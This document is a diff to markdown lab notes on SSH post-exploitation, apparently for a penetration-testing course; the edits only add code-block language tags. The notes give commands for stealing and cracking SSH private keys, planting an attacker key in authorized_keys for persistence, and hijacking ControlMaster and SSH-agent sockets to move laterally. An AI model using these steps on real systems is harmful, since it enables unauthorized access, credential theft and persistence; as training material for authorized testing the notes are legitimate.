@@ -8,7 +8,7 @@
 /home/user/.ssh/id_rsa
 ```
 
-```
+```bash
 find /home/ -name "id_rsa"
 ```
 
@@ -18,7 +18,7 @@ find /home/ -name "id_rsa"
 
 <summary>SSH with Private Key</summary>
 
-```
+```bash
 ssh -i svuser.key svuser@controller
 ```
 
@@ -36,7 +36,7 @@ ssh -i svuser.key svuser@controller
 
 <summary>Cracking passphrase of SSH key</summary>
 
-<pre><code><strong>#Copy file over to Kali
+<pre class="language-bash"><code class="lang-bash"><strong>#Copy file over to Kali
 </strong><strong>scp root@linuxvictim:/home/linuxvictim/svuser.key .
 </strong><strong>
 </strong><strong>#Convert the hash to format used by John &#x26;&#x26; Crack it
@@ -50,9 +50,13 @@ john --wordlist=/usr/share/wordlists/rockyou.txt svuser.hash
 
 <summary>Find Machines that's connected from the victim</summary>
 
-* cat \~/.ssh/known\_hosts
+* ```bash
+  cat ~/.ssh/known_hosts
+  ```
   * If HashKnownHosts is enabled --> entries in known\_hosts are hashed
-* cat \~/.bash\_history
+* ```bash
+  cat ~/.bash_history
+  ```
 
 </details>
 
@@ -61,19 +65,19 @@ john --wordlist=/usr/share/wordlists/rockyou.txt svuser.hash
 <summary>SSH Persistency</summary>
 
 * Generate SSH keypair
-  *   ```
+  *   ```bash
       ssh-keygen
       ```
 
 
 * Put Kali's public key (\~/.ssh/id\_rsa.pub) to victim authorized\_keys file
-  *   ```
+  *   ```bash
       echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8=" >> /home/linuxvictim/.ssh/authorized_keys
       ```
 
 
 * Now, can just:
-  * ```
+  * ```bash
     ssh linuxvictim@linuxvictim
     ```
 
@@ -122,7 +126,7 @@ amrois
 **ControlMaster feature**
 
 * In \~/.ssh/config
-  *   ```
+  *   ```tsconfig
       Host *
               ControlPath ~/.ssh/controlmaster/%r@%h:%p      --> specifies where the ControlMaster socket file is stored
               ControlMaster auto
@@ -131,14 +135,14 @@ amrois
 
 
 * Then,&#x20;
-  *   ```
+  *   ```bash
       chmod 644 ~/.ssh/config
       mkdir ~/.ssh/controlmaster
       ```
 
 
 * SSH to the controller box and from controller box ssh to linuxvictim
-  *   ```
+  *   ```bash
       ssh offsec@controller
       ssh offsec@linuxvictim
       ```
@@ -147,7 +151,7 @@ amrois
 * Now, in \~/.ssh/controlmaster
   * Have `offsec@linuxvictim:22`entry
 * Finally, attacker able to ssh into the linuxvictim machine from controller without having to enter any password --> "piggybacking" the active legit session to linuxvictim
-  * ```
+  * ```bash
     ssh offsec@linuxvictim
     OR
     ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim
@@ -163,38 +167,38 @@ amrois
 
 - Setting up
   * Installing public key to both intermediate and destination server
-    *   ```
+    *   ```bash
         ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller
         ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@linuxvictim
         ```
 
 
   * In kali: \~/.ssh/config
-    *   ```
+    *   ```bash
         ForwardAgent yes
         ```
 
 
   * In intermediate server /etc/ssh/sshd\_config
-    *   ```
+    *   ```bash
         AllowAgentForwarding yes
         ```
 
 
   * Start SSH agent on Kali
-    *   ```
+    *   ```bash
         eval `ssh-agent`
         ```
 
 
   * Add our keys to the SSH-agent on kali
-    *   ```
+    *   ```bash
         ssh-add
         ```
 
 
   * Now, able to ssh to intermediate server and from intermediate server ssh to destination server
-    *   <pre><code><strong>ssh offsec@controller
+    *   <pre class="language-bash"><code class="lang-bash"><strong>ssh offsec@controller
         </strong>ssh offsec@linuxvictim
         </code></pre>
 
@@ -209,35 +213,32 @@ Exploiting
 - ELSE if the attacker account is different from the current session user
   *   Ensure that user's open SSH-Agent socket is present:
 
-      ```
+      ```bash
       ps aux | grep ssh
       ```
 
 
   * Find PID of SSH process (Eg: bash(2161))
-    *   ```
+    *   ```bash
         pstree -p offsec | grep ssh
         ```
 
 
   * Search for the env variable called SSH\_AUTH\_SOCK
-    *   ```
+    *   ```bash
         cat /proc/2161/environ
         ```
 
 
   * Add SSH auth socket
-    *   ```
+    *   ```bash
         SSH_AUTH_SOCK=/tmp/ssh-qAgOqMO4H1/agent.2160 ssh-add -l
         ```
 
 
   * Use new SSH auth socket to login to linuxvictim
-    * ```
+    * ```bash
       SSH_AUTH_SOCK=/tmp/ssh-qAgOqMO4H1/agent.2160 ssh offsec@linuxvictim
       ```
 
 </details>
-
-
-
